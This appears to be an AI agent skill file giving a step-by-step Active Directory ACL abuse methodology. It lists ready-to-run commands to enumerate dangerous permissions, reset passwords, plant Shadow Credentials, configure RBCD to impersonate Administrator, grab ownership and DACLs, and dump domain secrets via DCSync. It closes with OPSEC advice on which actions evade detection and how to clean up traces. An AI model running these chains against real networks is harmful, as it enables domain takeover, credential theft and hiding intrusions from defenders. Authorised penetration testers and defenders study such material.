---
name: ad-acl-abuse
description: "Active Directory ACL abuse methodology. Use when BloodHound reveals dangerous ACEs such as GenericAll/WriteDACL/WriteOwner/GenericWrite/ForceChangePassword. Covers ACE enumeration, permission abuse chains, Shadow Credentials, and RBCD attacks"
zh-signals: "Active Directory ACL 滥用攻击，利用危险 ACE 实现域内提权。信号:ACL滥用,ActiveDirectory,BloodHound,ShadowCredentials,RBCD"
when-to-use: >-
  Use when BloodHound or ACL enumeration reveals dangerous ACEs (GenericAll, WriteDACL,
  WriteOwner, GenericWrite, ForceChangePassword) on AD objects and you need an abuse chain.
metadata:
  tags: "acl,dacl,ace,genericall,writedacl,writeowner,ad,bloodhound,aclabuse,ACLattack,shadow credentials"
  category: "lateral"
  mitre_attack: "T1222.001,T1098,T1484"
---

# AD ACL Abuse Methodology

> **Core Value**: Achieve privilege escalation through misconfigured permissions on AD objects, with no exploit required

## ⛔ Further Reading

- Detailed ACE permission bits and complete abuse chains → [references/ace-abuse-chains.md](references/ace-abuse-chains.md)
- Shadow Credentials and RBCD combination attacks → [references/shadow-creds-rbcd.md](references/shadow-creds-rbcd.md)

---

## Phase 1: Dangerous ACE Enumeration

### 1.1 BloodHound Path Discovery (Preferred)

```bash
# Data collection
bloodhound-python -d DOMAIN -u user -p pass -dc DC_IP -c all

# Query dangerous paths in BloodHound:
# - Shortest Path to Domain Admins
# - Find Principals with DCSync Rights
# - Find Dangerous Rights (ACL)
```

### 1.2 Manual Enumeration (Without BloodHound)

```bash
# Using dacledit.py (impacket)
dacledit.py -dc-ip DC_IP DOMAIN/user:pass -target 'Domain Admins' -action read

# Using PowerView (Windows)
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"}

# Using netexec
netexec ldap DC_IP -u user -p pass --dacl "CN=Domain Admins"
```

### 1.3 Key Dangerous Permission Quick Reference

| Permission | Mask | What It Allows |
|------|------|---------|
| GenericAll | 0x10000000 | Full control (change password / modify attributes / join groups) |
| GenericWrite | 0x40000000 | Write any attribute (SPN / script path / msDS-KeyCredential) |
| WriteDACL | 0x00040000 | Modify permissions (grant yourself GenericAll) |
| WriteOwner | 0x00080000 | Change the owner (then grant yourself permissions) |
| ForceChangePassword | ExtendedRight | Force a password reset (without knowing the original password) |
| Self (Member) | 0x00000008 | Add yourself to a group |
| AllExtendedRights | 0x00000100 | DCSync / ForceChangePassword |

## Phase 2: Abuse Decision Tree

```
Which permission? On which object?
│
├─ GenericAll on User
│   ├─ Reset password → net rpc password -U user%pass -S DC_IP target_user 'NewP@ss'
│   ├─ Targeted Kerberoasting → set SPN → request ticket → crack
│   ├─ Shadow Credentials → set msDS-KeyCredentialLink → obtain TGT
│   └─ Modify scriptPath → malicious script runs on next logon
│
├─ GenericAll on Group
│   └─ Add yourself to the group
│       net rpc group addmem "Domain Admins" user -U user%pass -S DC_IP
│
├─ GenericAll on Computer
│   ├─ RBCD → set msDS-AllowedToActOnBehalfOfOtherIdentity
│   └─ Shadow Credentials → set msDS-KeyCredentialLink
│
├─ WriteDACL on Object
│   └─ First grant yourself GenericAll → then follow the steps above
│       dacledit.py ... -target obj -action write -rights GenericAll -principal self
│
├─ WriteOwner on Object
│   └─ First set yourself as Owner → then WriteDACL → GenericAll
│       owneredit.py ... -target obj -new-owner self
│
├─ GenericWrite on User
│   ├─ Targeted Kerberoasting → set SPN
│   ├─ Shadow Credentials → set Key Credential
│   └─ Modify the logon script
│
├─ ForceChangePassword on User
│   └─ Directly reset the target password (⛔ locks out the original user)
│
└─ AllExtendedRights on Domain
    └─ DCSync → impacket-secretsdump DOMAIN/user:pass@DC_IP
```

## Phase 3: Common Exploitation Commands

### 3.1 GenericAll → Reset Password

```bash
# impacket
net rpc password target_user 'N3wP@ss!' -U 'DOMAIN/user%pass' -S DC_IP

# rpcclient
rpcclient -U "user%pass" DC_IP -c "setuserinfo2 target_user 23 N3wP@ss!"

# PowerView
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'N3wP@ss!' -AsPlainText -Force)
```

### 3.2 GenericAll/GenericWrite → Shadow Credentials

```bash
# pywhisker — add a Key Credential
python3 pywhisker.py -d DOMAIN -u user -p pass --dc-ip DC_IP \
  -t target_user -a add

# the resulting pfx file → use PKINITtools to obtain a TGT
python3 gettgtpkinit.py -cert-pfx output.pfx -pfx-pass PASS \
  DOMAIN/target_user target_user.ccache

# Use the TGT
export KRB5CCNAME=target_user.ccache
impacket-secretsdump -k -no-pass DOMAIN/target_user@DC_IP
```

### 3.3 GenericAll on Computer → RBCD

```bash
# Step 1: add or reuse a compromised machine account
impacket-addcomputer DOMAIN/user:pass -computer-name FAKE$ -computer-pass FakeP@ss

# Step 2: set msDS-AllowedToActOnBehalfOfOtherIdentity on the target machine
rbcd.py -dc-ip DC_IP -delegate-to TARGET$ -delegate-from FAKE$ DOMAIN/user:pass
# Or use impacket
impacket-rbcd DOMAIN/user:pass -dc-ip DC_IP -target TARGET$ -delegate-from FAKE$ -action write

# Step 3: S4U2Self + S4U2Proxy to obtain a service ticket
impacket-getST -spn cifs/TARGET.DOMAIN -impersonate Administrator \
  DOMAIN/FAKE$:FakeP@ss -dc-ip DC_IP

# Step 4: use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass TARGET.DOMAIN
```

### 3.4 WriteDACL → Escalate First

```bash
# Grant yourself GenericAll
dacledit.py -dc-ip DC_IP DOMAIN/user:pass \
  -target "CN=Target,DC=domain,DC=com" \
  -action write -rights GenericAll -principal user

# Then proceed with the GenericAll exploitation

# Cleanup: remove the added ACE after the operation
dacledit.py -dc-ip DC_IP DOMAIN/user:pass \
  -target "CN=Target,DC=domain,DC=com" \
  -action remove -rights GenericAll -principal user
```

### 3.5 WriteOwner → Take Over Ownership

```bash
# Change the object owner to yourself
owneredit.py -dc-ip DC_IP DOMAIN/user:pass \
  -target "CN=Target,DC=domain,DC=com" \
  -new-owner user

# The owner can modify the DACL → then WriteDACL → GenericAll
```

## Phase 4: OPSEC Notes

```
⛔ High-detection-risk operations:
├─ Password reset → user reports login failure → immediate exposure
├─ Modifying Domain Admins group membership → high-priority alert
├─ Modifying AdminSDHolder → reverted by SDProp + alert
└─ Large volumes of ACL queries → LDAP audit logs

✓ Relatively stealthy operations:
├─ Shadow Credentials → no password change, no group addition
├─ Targeted Kerberoasting → only adds an SPN, cracked offline
├─ RBCD → does not directly modify sensitive groups
└─ Modifying a non-privileged user → low alert level

Cleanup reminders:
├─ Remove the added SPN
├─ Remove the added Key Credential
├─ Remove the RBCD delegation configuration
├─ Restore the modified ACE
└─ Remove the created machine account
```

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| BloodHound | Visual ACL path discovery |
| dacledit.py (impacket) | DACL read and modification |
| owneredit.py | Modify the object owner |
| pywhisker | Shadow Credentials |
| rbcd.py / impacket-rbcd | RBCD configuration |
| impacket-addcomputer | Add a machine account |
| PKINITtools | Certificate → TGT |
| PowerView | Windows-side ACL operations |
